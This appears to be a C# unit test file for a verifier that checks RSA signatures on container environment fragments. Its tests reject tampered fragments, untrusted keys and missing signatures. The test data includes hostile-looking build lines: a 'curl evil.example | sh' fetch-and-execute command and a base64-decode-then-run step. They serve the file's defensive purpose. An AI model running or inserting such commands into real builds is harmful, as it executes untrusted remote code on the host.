using System.Security.Cryptography;
using System.Text;
using Auxilia.Core.Runner.Workflows;

namespace Auxilia.Core.Runner.Tests.Workflows;

[TestFixture, Category("Unit")]
public sealed class EnvironmentFragmentVerifierTests
{
    private const string Fragment = "RUN echo abc | base64 -d > /tmp/s.sh && sh -e /tmp/s.sh\n";

    private static (string Signature, string PublicKey) Sign(string fragment, RSA rsa)
        => (Convert.ToBase64String(rsa.SignHash(
                SHA256.HashData(Encoding.UTF8.GetBytes(fragment)),
                HashAlgorithmName.SHA256, RSASignaturePadding.Pss)),
            Convert.ToBase64String(rsa.ExportSubjectPublicKeyInfo()));

    [Test]
    public void TrustedSignature_Verifies()
    {
        using var rsa = RSA.Create();
        var (signature, publicKey) = Sign(Fragment, rsa);

        Assert.That(EnvironmentFragmentVerifier.Verify(Fragment, signature, publicKey, [publicKey]),
            Is.True);
    }

    [Test]
    public void TamperedFragment_IsRejected()
    {
        using var rsa = RSA.Create();
        var (signature, publicKey) = Sign(Fragment, rsa);

        Assert.That(EnvironmentFragmentVerifier.Verify(
                Fragment + "RUN curl evil.example | sh\n", signature, publicKey, [publicKey]),
            Is.False);
    }

    [Test]
    public void UntrustedPublisherKey_IsRejected_EvenWithAValidSignature()
    {
        using var attacker = RSA.Create();
        using var trusted = RSA.Create();
        var (signature, attackerKey) = Sign(Fragment, attacker);
        var trustedKey = Convert.ToBase64String(trusted.ExportSubjectPublicKeyInfo());

        Assert.That(EnvironmentFragmentVerifier.Verify(Fragment, signature, attackerKey, [trustedKey]),
            Is.False, "a self-signed fragment must not pass — the KEY is the trust anchor");
    }

    [Test]
    public void MissingSignature_IsRejected_WhenTrustIsConfigured()
    {
        Assert.That(EnvironmentFragmentVerifier.Verify(Fragment, null, null, ["some-key"]), Is.False);
    }

    [Test]
    public void NoConfiguredTrustKeys_IsPermissive_DevHosts()
    {
        Assert.That(EnvironmentFragmentVerifier.Verify(Fragment, null, null, []), Is.True);
    }
}
